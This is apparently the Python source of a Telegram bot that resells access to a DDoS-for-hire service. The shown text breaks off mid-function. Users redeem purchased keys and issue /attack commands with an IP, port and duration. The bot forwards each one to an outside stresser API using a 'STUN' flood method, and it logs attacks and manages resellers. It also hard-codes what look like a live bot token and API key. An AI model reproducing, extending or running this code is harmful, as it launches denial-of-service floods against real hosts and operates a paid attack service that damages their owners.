# - Complete Working Bot with JSON Storage (No Env)
# RULES: Attack 1-300 seconds ONLY | 60s Individual Cooldown (HIDDEN)
import telebot
import threading
import os
import random
import string
import re
import requests
import time
from datetime import datetime, timedelta
import json

# ============ HARDCODED IMMUTABLE RULES ============
MIN_ATTACK_TIME = 1
MAX_ATTACK_TIME = 300
USER_COOLDOWN_SECONDS = 60

# ============ HARDCODED CONFIGURATION ============
BOT_TOKEN = "8640367692:AAE-Ip_Wd8nUanuRLbcRb4UMroW96RqsL2A"  # ← PUT YOUR BOT TOKEN HERE
BOT_OWNER = 1434287051  # ← YOUR TELEGRAM USER ID

# RetroStress API Configuration (Hardcoded)
API_CONFIG = {
    "url": "https://api.battle-destroyer.shop",
    "api_key": "ak_ebc4392db8b9aeb6525a3a9b43a24256e62ec69ab19bcdb3",
    "timeout": 30
}

# ============ DATA STORAGE ============
DATA_DIR = "bot_data"
os.makedirs(DATA_DIR, exist_ok=True)

KEYS_FILE = os.path.join(DATA_DIR, "keys.json")
USERS_FILE = os.path.join(DATA_DIR, "users.json")
ADMINS_FILE = os.path.join(DATA_DIR, "admins.json")
ATTACK_LOGS_FILE = os.path.join(DATA_DIR, "attack_logs.json")
BOT_USERS_FILE = os.path.join(DATA_DIR, "bot_users.json")
SETTINGS_FILE = os.path.join(DATA_DIR, "settings.json")

def load_json(file_path, default=None):
    if default is None:
        default = {}
    if os.path.exists(file_path):
        try:
            with open(file_path, 'r') as f:
                return json.load(f)
        except:
            return default
    return default

def save_json(file_path, data):
    with open(file_path, 'w') as f:
        json.dump(data, f, indent=2, default=str)

# ============ DATA ACCESS FUNCTIONS ============
def get_keys():
    return load_json(KEYS_FILE, {})

def save_keys(keys):
    save_json(KEYS_FILE, keys)

def get_users():
    return load_json(USERS_FILE, {})

def save_users(users):
    save_json(USERS_FILE, users)

def get_admins():
    return load_json(ADMINS_FILE, {})

def save_admins(admins):
    save_json(ADMINS_FILE, admins)

def get_attack_logs():
    return load_json(ATTACK_LOGS_FILE, [])

def save_attack_logs(logs):
    save_json(ATTACK_LOGS_FILE, logs)

def get_bot_users():
    return load_json(BOT_USERS_FILE, {})

def save_bot_users(users):
    save_json(BOT_USERS_FILE, users)

def get_settings():
    return load_json(SETTINGS_FILE, {})

def save_settings(settings):
    save_json(SETTINGS_FILE, settings)

# ============ SETTINGS FUNCTIONS ============
def get_maintenance_mode():
    return get_setting('maintenance_mode', False)

def set_maintenance_mode(value, msg=None):
    set_setting('maintenance_mode', value)
    if msg:
        set_setting('maintenance_msg', msg)

def get_maintenance_msg():
    return get_setting('maintenance_msg', "🔧 Bot is in maintenance mode. Please try again later.")

def get_blocked_ips():
    return get_setting('blocked_ips', [])

def add_blocked_ip(ip_prefix):
    blocked = get_blocked_ips()
    if ip_prefix not in blocked:
        blocked.append(ip_prefix)
        set_setting('blocked_ips', blocked)
        return True
    return False

def remove_blocked_ip(ip_prefix):
    blocked = get_blocked_ips()
    if ip_prefix in blocked:
        blocked.remove(ip_prefix)
        set_setting('blocked_ips', blocked)
        return True
    return False

def get_setting(key, default):
    settings = get_settings()
    return settings.get(key, default)

def set_setting(key, value):
    settings = get_settings()
    settings[key] = value
    save_settings(settings)

# ============ ROLE FUNCTIONS ============
def is_owner(user_id):
    return user_id == BOT_OWNER

def is_admin(user_id):
    admins = get_admins()
    admin = admins.get(str(user_id))
    return admin is not None and not admin.get('blocked', False)

def get_admin(user_id):
    admins = get_admins()
    return admins.get(str(user_id))

def has_valid_key(user_id):
    users = get_users()
    user = users.get(str(user_id))
    if not user or not user.get('key_expiry'):
        return False
    expiry = datetime.fromisoformat(user['key_expiry'])
    return expiry > datetime.now()

def get_time_remaining(user_id):
    users = get_users()
    user = users.get(str(user_id))
    if not user or not user.get('key_expiry'):
        return "0d 0h 0m 0s"
    expiry = datetime.fromisoformat(user['key_expiry'])
    remaining = expiry - datetime.now()
    if remaining.total_seconds() <= 0:
        return "0d 0h 0m 0s"
    days = remaining.days
    hours, remainder = divmod(remaining.seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{days}d {hours}h {minutes}m {seconds}s"

# ============ BOT INITIALIZATION ============
bot = telebot.TeleBot(BOT_TOKEN)
BOT_START_TIME = datetime.now()

# ============ GLOBAL VARIABLES ============
active_attacks = {}
user_cooldowns = {}
_attack_lock = threading.Lock()

# ============ HELPER FUNCTIONS ============
def safe_send_message(chat_id, text, reply_to=None, parse_mode="Markdown"):
    try:
        if reply_to:
            try:
                return bot.reply_to(reply_to, text, parse_mode=parse_mode)
            except:
                return bot.send_message(chat_id, text, parse_mode=None)
        else:
            return bot.send_message(chat_id, text, parse_mode=parse_mode)
    except Exception as e:
        print(f"Safe send error: {e}")
        return None

def get_user_cooldown_time(user_id):
    if str(user_id) in user_cooldowns:
        cooldown_end = user_cooldowns[str(user_id)]
        remaining = (cooldown_end - datetime.now()).total_seconds()
        if remaining > 0:
            return int(remaining)
        else:
            del user_cooldowns[str(user_id)]
    return 0

def set_user_cooldown(user_id):
    user_cooldowns[str(user_id)] = datetime.now() + timedelta(seconds=USER_COOLDOWN_SECONDS)

def validate_target(target):
    ip_pattern = re.compile(r'^(\d{1,3}\.){3}\d{1,3}$')
    if ip_pattern.match(target):
        parts = target.split('.')
        for part in parts:
            if int(part) > 255:
                return False
        return True
    return False

def is_ip_blocked(ip):
    blocked = get_blocked_ips()
    for prefix in blocked:
        if ip.startswith(prefix):
            return True
    return False

def check_maintenance(message):
    if get_maintenance_mode() and not is_owner(message.from_user.id):
        safe_send_message(message.chat.id, get_maintenance_msg(), reply_to=message)
        return True
    return False

def check_banned(message):
    user_id = message.from_user.id
    if is_owner(user_id):
        return False
    users = get_users()
    user = users.get(str(user_id))
    if user and user.get('banned'):
        return True
    return False

def log_attack(user_id, username, target, port, duration):
    logs = get_attack_logs()
    logs.append({
        'user_id': user_id,
        'username': username,
        'target': target,
        'port': port,
        'duration': duration,
        'timestamp': datetime.now().isoformat()
    })
    save_attack_logs(logs[-500:])

def track_bot_user(user_id, username=None):
    users = get_bot_users()
    if str(user_id) not in users:
        users[str(user_id)] = {
            'user_id': user_id,
            'username': username,
            'first_seen': datetime.now().isoformat()
        }
        save_bot_users(users)

def generate_key(length=12):
    chars = string.ascii_uppercase + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def resolve_user(input_str):
    input_str = input_str.strip().lstrip('@')
    try:
        user_id = int(input_str)
        return user_id, None
    except ValueError:
        pass
    users = get_users()
    for uid, user in users.items():
        if user.get('username') and user['username'].lower() == input_str.lower():
            return int(uid), user['username']
    admins = get_admins()
    for aid, admin in admins.items():
        if admin.get('username') and admin['username'].lower() == input_str.lower():
            return int(aid), admin['username']
    return None, None

def parse_duration(duration_str):
    duration_str = duration_str.lower().strip()
    if duration_str.endswith('h'):
        hours = int(duration_str[:-1])
        if hours < 1 or hours > 8760:
            return None, None, "Hours must be between 1-8760"
        seconds = hours * 3600
        label = f"{hours} hour(s)"
        return seconds, label, None
    elif duration_str.endswith('d'):
        days = int(duration_str[:-1])
        if days < 1 or days > 365:
            return None, None, "Days must be between 1-365"
        seconds = days * 86400
        label = f"{days} day(s)"
        return seconds, label, None
    else:
        return None, None, "Invalid format! Use 'h' for hours or 'd' for days"

def send_attack_via_api(target, port, duration):
    try:
        params = {
            "key": API_CONFIG['api_key'],
            "target": target,
            "port": int(port),
            "time": int(duration),
            "method": "STUN",
            "concurrent": 1
        }
        response = requests.get(API_CONFIG['url'], params=params, timeout=30)
        return response.status_code == 200 or response.status_code == 201
    except Exception as e:
        print(f"API error: {e}")
        return False

def start_attack(target, port, duration, message, attack_id):
    try:
        user_id = message.from_user.id
        username = message.from_user.username or message.from_user.first_name or str(user_id)
        
        log_attack(user_id, username, target, port, duration)
        
        safe_send_message(message.chat.id, f"✅ Attack Launched!\n\n🎯 Target: `{target}:{port}`\n⏱️ Duration: `{duration}`s\n\n🔔 Use /status to see live progress!\n🔔 You'll be notified when attack completes.", reply_to=message)
        
        success = send_attack_via_api(target, port, duration)
        if success:
            print(f"✅ Attack sent for user {user_id}")
        
        time.sleep(duration)
        
        with _attack_lock:
            if attack_id in active_attacks:
                del active_attacks[attack_id]
        
        set_user_cooldown(user_id)
        
        safe_send_message(message.chat.id, f"✅ Attack Complete!\n\n🎯 Target: `{target}:{port}`\n⏱️ Duration: `{duration}` seconds", reply_to=message)
        
    except Exception as e:
        with _attack_lock:
            if attack_id in active_attacks:
                del active_attacks[attack_id]
        print(f"Attack error: {e}")

def build_status_message(user_id):
    user_attack_active = False
    user_attack_info = None
    
    with _attack_lock:
        now = datetime.now()
        for attack_id, attack in list(active_attacks.items()):
            if attack['end_time'] <= now:
                continue
            if attack.get('user_id') == user_id:
                user_attack_active = True
                user_attack_info = attack
                break
    
    if user_attack_active and user_attack_info:
        remaining = int((user_attack_info['end_time'] - datetime.now()).total_seconds())
        total = user_attack_info['duration']
        elapsed = total - remaining
        progress = int((elapsed / total) * 100)
        
        bar_length = 20
        filled = int(bar_length * progress / 100)
        bar = '█' * filled + '░' * (bar_length - filled)
        
        ends_at = (user_attack_info['end_time']).strftime('%H:%M:%S')
        
        response = f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        response += f"┃      🔥 ACTIVE ATTACK STATUS 🔥      ┃\n"
        response += f"┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
        response += f"┃ 📌 Target:     {user_attack_info['target']}:{user_attack_info['port']}\n"
        response += f"┃ ⏱️  Duration:   {total} seconds\n"
        response += f"┃ ⏳ Remaining:  {remaining} seconds\n"
        response += f"┃ 📊 Progress:   {bar} {progress}%\n"
        response += f"┃ ⏰ Ends at:    {ends_at}\n"
        response += f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
    else:
        response = f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        response += f"┃         💤 NO ACTIVE ATTACK        ┃\n"
        response += f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
    
    return response

# ============ TELEGRAM COMMANDS ============

@bot.message_handler(commands=["id"])
def id_command(message):
    if check_banned(message): return
    user_id = message.from_user.id
    safe_send_message(message.chat.id, f"`{user_id}`", reply_to=message)

@bot.message_handler(commands=["ping"])
def ping_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        return
    total_users = len(get_users())
    maintenance_status = "✅ Disabled" if not get_maintenance_mode() else "🔴 Enabled"
    
    uptime_seconds = (datetime.now() - BOT_START_TIME).total_seconds()
    hours = int(uptime_seconds // 3600)
    minutes = int((uptime_seconds % 3600) // 60)
    seconds = int(uptime_seconds % 60)
    uptime_str = f"{hours}h {minutes:02d}m {seconds:02d}s"
    
    response = f"🏓 Pong!\n\n"
    response += f"• Response Time: 1ms\n"
    response += f"• Bot Status: 🟢 Online\n"
    response += f"• Users: {total_users}\n"
    response += f"• Maintenance Mode: {maintenance_status}\n"
    response += f"• Uptime: {uptime_str}\n"
    response += f"• Attack Range: {MIN_ATTACK_TIME}-{MAX_ATTACK_TIME}s"
    
    safe_send_message(message.chat.id, response, reply_to=message)

@bot.message_handler(commands=["attack"])
def handle_attack(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    
    # CHECK 1: Does user have an active attack already?
    with _attack_lock:
        now = datetime.now()
        for attack_id, attack in active_attacks.items():
            if attack.get('user_id') == user_id and attack['end_time'] > now:
                safe_send_message(message.chat.id, f"❌ *ATTACK IN PROGRESS!*\n\n⚠️ You already have an active attack!\n\nPlease wait for your current attack to finish before starting a new one.", reply_to=message)
                return
    
    # CHECK 2: Is user on cooldown? (NO time shown)
    cooldown = get_user_cooldown_time(user_id)
    if cooldown > 0:
        safe_send_message(message.chat.id, f"⏳ *COOLDOWN ACTIVE!*\n\n⚠️ You are on cooldown. Please wait before your next attack.", reply_to=message)
        return
    
    # CHECK 3: Does user have a valid key? (Owner is exempt)
    if not has_valid_key(user_id) and not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ You don't have a valid key!\n\n🔑 Contact owner or admin to get access.\n📞 OWNER", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 4:
        safe_send_message(message.chat.id, f"⚠️ *Usage:* /attack <ip> <port> <time>\n\n📌 **Attack Limits:**\n• Min Time: `{MIN_ATTACK_TIME}` second\n• Max Time: `{MAX_ATTACK_TIME}` seconds", reply_to=message)
        return
    
    target, port, duration = command_parts[1], command_parts[2], command_parts[3]
    
    if not validate_target(target):
        safe_send_message(message.chat.id, "❌ Invalid IP address!\n\nExample: `192.168.1.1`", reply_to=message)
        return
    
    if is_ip_blocked(target):
        safe_send_message(message.chat.id, "🚫 This IP is blocked! Use another IP.", reply_to=message)
        return
    
    try:
        port = int(port)
        if port < 1 or port > 65535:
            safe_send_message(message.chat.id, "❌ Invalid port! (1-65535)", reply_to=message)
            return
        duration = int(duration)
        
        if duration < MIN_ATTACK_TIME:
            safe_send_message(message.chat.id, f"❌ Minimum attack time is `{MIN_ATTACK_TIME}` second!\n\n📌 Attack range: `{MIN_ATTACK_TIME}-{MAX_ATTACK_TIME}` seconds", reply_to=message)
            return
        
        if duration > MAX_ATTACK_TIME:
            safe_send_message(message.chat.id, f"❌ Maximum attack time is `{MAX_ATTACK_TIME}` seconds!\n\n📌 Attack range: `{MIN_ATTACK_TIME}-{MAX_ATTACK_TIME}` seconds", reply_to=message)
            return
        
        attack_id = f"{user_id}_{datetime.now().timestamp()}"
        
        with _attack_lock:
            active_attacks[attack_id] = {
                'target': target,
                'port': port,
                'duration': duration,
                'user_id': user_id,
                'start_time': datetime.now(),
                'end_time': datetime.now() + timedelta(seconds=duration)
            }
        
        thread = threading.Thread(target=start_attack, args=(target, port, duration, message, attack_id))
        thread.daemon = True
        thread.start()
        
    except ValueError:
        safe_send_message(message.chat.id, "❌ Port and time must be numbers!\n\nExample: /attack 192.168.1.1 443 60", reply_to=message)

@bot.message_handler(commands=["status"])
def status_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id

    if not has_valid_key(user_id) and not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ You don't have a valid key!\n\n🔑 Contact owner or admin to get access.\n📞 OWNER", reply_to=message)
        return

    response = build_status_message(user_id)
    sent_msg = safe_send_message(message.chat.id, response, reply_to=message)
    
    with _attack_lock:
        has_active = any(attack.get('user_id') == user_id and attack['end_time'] > datetime.now() 
                        for attack in active_attacks.values())
    
    if has_active:
        threading.Thread(target=auto_update_status, args=(sent_msg.chat.id, sent_msg.message_id, user_id), daemon=True).start()

def auto_update_status(chat_id, message_id, user_id):
    try:
        while True:
            time.sleep(2)
            
            with _attack_lock:
                has_active = any(attack.get('user_id') == user_id and attack['end_time'] > datetime.now() 
                                for attack in active_attacks.values())
            
            if not has_active:
                break
                
            new_response = build_status_message(user_id)
            try:
                bot.edit_message_text(new_response, chat_id=chat_id, message_id=message_id, parse_mode="Markdown")
            except:
                break
    except:
        pass

@bot.message_handler(commands=["redeem"])
def redeem_key_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    user_name = message.from_user.first_name
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /redeem <key>\n\nExample: /redeem G326JSO39J64", reply_to=message)
        return
    
    key_input = command_parts[1]
    keys = get_keys()
    key_doc = keys.get(key_input)
    
    if not key_doc:
        safe_send_message(message.chat.id, f"❌ Invalid key: `{key_input}`", reply_to=message)
        return
    
    if key_doc.get('used'):
        safe_send_message(message.chat.id, f"❌ This key has already been used: `{key_input}`", reply_to=message)
        return
    
    users = get_users()
    
    expiry_time = datetime.now() + timedelta(seconds=key_doc['duration_seconds'])
    
    users[str(user_id)] = {
        'user_id': user_id,
        'username': user_name,
        'key': key_input,
        'key_expiry': expiry_time.isoformat(),
        'key_duration_seconds': key_doc['duration_seconds'],
        'key_duration_label': key_doc['duration_label'],
        'redeemed_at': datetime.now().isoformat(),
        'added_by': key_doc.get('created_by'),
        'added_by_name': key_doc.get('created_by_name'),
        'added_by_method': 'key_generation',
        'generated_by': key_doc.get('created_by'),
        'key_used': key_input
    }
    save_users(users)
    
    keys[key_input]['used'] = True
    keys[key_input]['used_by'] = user_id
    keys[key_input]['used_at'] = datetime.now().isoformat()
    save_keys(keys)
    
    remaining = get_time_remaining(user_id)
    safe_send_message(message.chat.id, f"✅ Key Redeemed!\n\n🔑 Key: `{key_input}`\n⏰ Duration: {key_doc['duration_label']}\n⏳ Time Left: {remaining}\n\n🔥 Use /attack to start attacking!", reply_to=message)

@bot.message_handler(commands=["mykey"])
def my_key_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    
    if not has_valid_key(user_id):
        safe_send_message(message.chat.id, "❌ You don't have a valid key! Contact Owner", reply_to=message)
        return
    
    remaining = get_time_remaining(user_id)
    safe_send_message(message.chat.id, f"🔑 *Key Details*\n\n⏳ Remaining: `{remaining}`\n✅ Status: Active\n\n📌 Attack Range: `{MIN_ATTACK_TIME}-{MAX_ATTACK_TIME}` seconds", reply_to=message)

@bot.message_handler(commands=["gen"])
def generate_key_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id) and not is_admin(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by owner/admin!", reply_to=message)
        return
    
    command_parts = message.text.split()
    
    if len(command_parts) == 2:
        duration_str = command_parts[1].lower()
        count = 1
    elif len(command_parts) == 3:
        duration_str = command_parts[1].lower()
        try:
            count = int(command_parts[2])
            if count < 1 or count > 20:
                safe_send_message(message.chat.id, "❌ Count must be between 1-20!", reply_to=message)
                return
        except:
            safe_send_message(message.chat.id, "❌ Invalid count!", reply_to=message)
            return
    else:
        safe_send_message(message.chat.id, f"⚠️ Usage:\n• /gen <duration> - Generate 1 key\n• /gen <duration> <count> - Generate multiple keys\n\n📌 Examples:\n• `/gen 5h` - 5 hours\n• `/gen 3d` - 3 days\n• `/gen 24h 5` - 5 keys of 24 hours\n• `/gen 7d 3` - 3 keys of 7 days\n\n⏱️ Any duration allowed: 1h-8760h or 1d-365d", reply_to=message)
        return
    
    seconds, label, error = parse_duration(duration_str)
    if error:
        safe_send_message(message.chat.id, f"❌ {error}\n\n📌 Examples:\n• `/gen 5h` - 5 hours\n• `/gen 3d` - 3 days", reply_to=message)
        return
    
    created_by_name = message.from_user.first_name or message.from_user.username or str(user_id)
    if is_owner(user_id):
        created_by_name = "Owner"
    
    keys = get_keys()
    generated_keys = []
    for _ in range(count):
        key = generate_key(12)
        keys[key] = {
            'key': key,
            'duration_seconds': seconds,
            'duration_label': label,
            'created_at': datetime.now().isoformat(),
            'created_by': user_id,
            'created_by_name': created_by_name,
            'used': False
        }
        generated_keys.append(key)
    save_keys(keys)
    
    if count == 1:
        response = f"✅ Key Generated!\n\n🔑 Key: `{generated_keys[0]}`\n⏱️ Duration: {label}\n\nUse: `/redeem {generated_keys[0]}`"
    else:
        keys_list = "\n".join([f"• `{k}`" for k in generated_keys])
        response = f"✅ {count} Keys Generated!\n\n🔑 Keys:\n{keys_list}\n\n⏱️ Duration: {label}\n\nUse: `/redeem <key>`"
    
    safe_send_message(message.chat.id, response, reply_to=message)

@bot.message_handler(commands=["delkey"])
def delete_key_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id) and not is_admin(user_id):
        safe_send_message(message.chat.id, "❌ Owner/Admin only!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /delkey <key>\n\nExample: /delkey G326JSO39J64", reply_to=message)
        return
    
    key_input = command_parts[1]
    keys = get_keys()
    
    if key_input not in keys:
        safe_send_message(message.chat.id, f"❌ Key `{key_input}` not found!", reply_to=message)
        return
    
    key_data = keys[key_input]
    
    if is_admin(user_id) and not is_owner(user_id):
        created_by = key_data.get('created_by')
        if created_by != user_id:
            safe_send_message(message.chat.id, "❌ You can only delete keys you generated!", reply_to=message)
            return
    
    if key_data.get('used'):
        used_by = key_data.get('used_by', 'Unknown')
        safe_send_message(message.chat.id, f"❌ Cannot delete used key!\n\n🔑 Key: `{key_input}`\n✅ Status: Already redeemed by user `{used_by}`", reply_to=message)
        return
    
    del keys[key_input]
    save_keys(keys)
    
    safe_send_message(message.chat.id, f"✅ Key Deleted!\n\n🔑 Key: `{key_input}`\n🗑️ Successfully removed from database.", reply_to=message)

@bot.message_handler(commands=["approve"])
def approve_user_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id) and not is_admin(user_id):
        safe_send_message(message.chat.id, "❌ Owner/Admin only!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 3:
        safe_send_message(message.chat.id, f"⚠️ Usage: /approve <user_id> <duration>\n\n📌 Examples:\n• `/approve 123456789 30d` - 30 days\n• `/approve 123456789 12h` - 12 hours\n• `/approve 123456789 5d` - 5 days\n\n⏱️ Any duration allowed: 1h-8760h or 1d-365d", reply_to=message)
        return
    
    try:
        target_id = int(command_parts[1])
        duration_str = command_parts[2].lower()
        
        seconds, label, error = parse_duration(duration_str)
        if error:
            safe_send_message(message.chat.id, f"❌ {error}\n\n📌 Examples:\n• `/approve 123456789 30d`\n• `/approve 123456789 12h`", reply_to=message)
            return
            
    except ValueError:
        safe_send_message(message.chat.id, "❌ Invalid user ID!\n\nExample: `/approve 123456789 30d`", reply_to=message)
        return
    
    users = get_users()
    expiry_time = datetime.now() + timedelta(seconds=seconds)
    
    approved_by = user_id
    approved_by_name = message.from_user.first_name or message.from_user.username or str(user_id)
    
    if is_owner(user_id):
        approved_by_name = "Owner"
    else:
        admin = get_admin(user_id)
        if admin and admin.get('username'):
            approved_by_name = admin.get('username')
    
    try:
        chat = bot.get_chat(target_id)
        username = chat.username or chat.first_name or str(target_id)
    except:
        username = str(target_id)
    
    users[str(target_id)] = {
        'user_id': target_id,
        'username': username,
        'key_expiry': expiry_time.isoformat(),
        'key_duration_label': label,
        'key_duration_seconds': seconds,
        'approved_at': datetime.now().isoformat(),
        'approved_by': approved_by,
        'approved_by_name': approved_by_name,
        'approved_by_method': 'direct_approval'
    }
    save_users(users)
    
    safe_send_message(message.chat.id, f"✅ User Approved!\n\n👤 User: `{target_id}`\n📅 Duration: `{label}`\n⏰ Expires: `{expiry_time.strftime('%Y-%m-%d %H:%M:%S')}`\n\n👑 Approved by: {approved_by_name}", reply_to=message)
    
    try:
        bot.send_message(target_id, f"🎉 You have been approved by {approved_by_name}!\n\n📅 Access expires: `{expiry_time.strftime('%Y-%m-%d %H:%M:%S')}`\n\n⚠️ Attack Rules:\n• Time: `{MIN_ATTACK_TIME}-{MAX_ATTACK_TIME}` seconds\n\n🔥 Use /attack to start!", parse_mode="Markdown")
    except:
        pass

@bot.message_handler(commands=["remove"])
def remove_user_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id) and not is_admin(user_id):
        safe_send_message(message.chat.id, "❌ Owner/Admin only!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /remove <user_id>\n\nExample: /remove 123456789", reply_to=message)
        return
    
    try:
        target_id = int(command_parts[1])
    except:
        safe_send_message(message.chat.id, "❌ Invalid user ID! Use numbers only.", reply_to=message)
        return
    
    users = get_users()
    
    if str(target_id) not in users:
        safe_send_message(message.chat.id, f"❌ User `{target_id}` not found in database!", reply_to=message)
        return
    
    target_user = users[str(target_id)]
    
    if is_admin(user_id) and not is_owner(user_id):
        approved_by = target_user.get('approved_by')
        generated_by = target_user.get('generated_by')
        
        if approved_by != user_id and generated_by != user_id:
            safe_send_message(message.chat.id, "❌ You can only remove users you approved or who used your keys!", reply_to=message)
            return
    
    username = target_user.get('username', str(target_id))
    
    del users[str(target_id)]
    save_users(users)
    
    safe_send_message(message.chat.id, f"✅ User `{username}` (`{target_id}`) removed successfully!", reply_to=message)
    
    try:
        bot.send_message(target_id, "❌ Your access has been revoked by an admin.\n\nContact Admin or Seller for more information.")
    except:
        pass

@bot.message_handler(commands=["add_admin"])
def add_admin_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ Owner only!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /add_admin <id or @username>", reply_to=message)
        return
    
    admin_id, resolved_name = resolve_user(command_parts[1])
    if not admin_id:
        safe_send_message(message.chat.id, "❌ User not found!", reply_to=message)
        return
    
    admins = get_admins()
    if str(admin_id) in admins:
        safe_send_message(message.chat.id, "❌ This user is already an admin!", reply_to=message)
        return
    
    admins[str(admin_id)] = {
        'user_id': admin_id,
        'username': resolved_name,
        'added_at': datetime.now().isoformat(),
        'added_by': user_id,
        'blocked': False
    }
    save_admins(admins)
    
    safe_send_message(message.chat.id, f"✅ Admin added!\n\n👤 User: `{resolved_name or admin_id}`", reply_to=message)
    
    try:
        bot.send_message(admin_id, "🎉 You have been promoted to Admin!\n\nYou can now:\n• /gen - Generate unlimited keys\n• /delkey - Delete keys you generated\n• /approve - Approve users directly\n• /remove - Remove users you approved or who used your keys\n• /my_users - List users you added\n\nUse /help to see all commands.")
    except:
        pass

@bot.message_handler(commands=["remove_admin"])
def remove_admin_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ Owner only!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /remove_admin <id or @username>", reply_to=message)
        return
    
    target_id, resolved_name = resolve_user(command_parts[1])
    if not target_id:
        safe_send_message(message.chat.id, "❌ User not found!", reply_to=message)
        return
    
    admins = get_admins()
    if str(target_id) not in admins:
        safe_send_message(message.chat.id, "❌ This user is not an admin!", reply_to=message)
        return
    
    del admins[str(target_id)]
    save_admins(admins)
    
    safe_send_message(message.chat.id, f"✅ Admin `{resolved_name or target_id}` removed successfully!", reply_to=message)

@bot.message_handler(commands=["all_admins"])
def all_admins_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ Owner only!", reply_to=message)
        return
    
    admins = get_admins()
    if not admins:
        safe_send_message(message.chat.id, "📋 No admins found!", reply_to=message)
        return
    
    response = "📊 *ADMINS LIST*\n\n"
    
    for aid, admin in admins.items():
        username = admin.get('username', 'Unknown')
        response += f"• `{aid}` - {username}\n"
    
    response += f"\n👥 Total: {len(admins)}"
    safe_send_message(message.chat.id, response)

@bot.message_handler(commands=["my_users"])
def my_users_command(message):
    user_id = message.from_user.id
    
    if not is_admin(user_id) and not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ Admin only!", reply_to=message)
        return
    
    users = get_users()
    my_users = []
    
    for uid, user in users.items():
        approved_by = user.get('approved_by')
        generated_by = user.get('generated_by')
        
        if is_owner(user_id):
            my_users.append((uid, user))
        elif approved_by == user_id or generated_by == user_id:
            my_users.append((uid, user))
    
    if not my_users:
        safe_send_message(message.chat.id, "📋 No users added by you!", reply_to=message)
        return
    
    response = "📊 *USERS ADDED BY YOU*\n\n"
    
    for uid, user in my_users:
        username = user.get('username', 'Unknown')
        key_expiry = user.get('key_expiry')
        
        if key_expiry:
            try:
                expiry = datetime.fromisoformat(key_expiry)
                if expiry > datetime.now():
                    remaining_days = (expiry - datetime.now()).days
                    remaining_hours = (expiry - datetime.now()).seconds // 3600
                    response += f"• `{uid}` - {username} - `{remaining_days}d {remaining_hours}h` left\n"
                else:
                    response += f"• `{uid}` - {username} - ❌ EXPIRED\n"
            except:
                response += f"• `{uid}` - {username} - Invalid date\n"
        else:
            response += f"• `{uid}` - {username} - No key\n"
    
    response += f"\n📈 Total: {len(my_users)}"
    safe_send_message(message.chat.id, response)

@bot.message_handler(commands=["all_users"])
def all_users_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ Owner only!", reply_to=message)
        return
    
    users = get_users()
    if not users:
        safe_send_message(message.chat.id, "📋 No users found!", reply_to=message)
        return
    
    response = "📊 *USERS LIST*\n\n"
    
    for uid, user in users.items():
        username = user.get('username', 'Unknown')
        key_expiry = user.get('key_expiry')
        approved_by = user.get('approved_by_name', 'Unknown')
        
        if key_expiry:
            try:
                expiry = datetime.fromisoformat(key_expiry)
                if expiry > datetime.now():
                    remaining_days = (expiry - datetime.now()).days
                    remaining_hours = (expiry - datetime.now()).seconds // 3600
                    response += f"• `{uid}` - {username} - `{remaining_days}d {remaining_hours}h` left (by: {approved_by})\n"
                else:
                    response += f"• `{uid}` - {username} - ❌ EXPIRED (by: {approved_by})\n"
            except:
                response += f"• `{uid}` - {username} - Invalid date\n"
        else:
            response += f"• `{uid}` - {username} - No key\n"
    
    response += f"\n📈 Total: {len(users)}"
    safe_send_message(message.chat.id, response)

@bot.message_handler(commands=["block_ip"])
def block_ip_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /block_ip <ip_prefix>\nExample: /block_ip 192.168.", reply_to=message)
        return
    
    if add_blocked_ip(command_parts[1]):
        safe_send_message(message.chat.id, f"✅ IP blocked: `{command_parts[1]}*`", reply_to=message)
    else:
        safe_send_message(message.chat.id, "❌ IP already blocked!", reply_to=message)

@bot.message_handler(commands=["unblock_ip"])
def unblock_ip_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /unblock_ip <ip_prefix>", reply_to=message)
        return
    
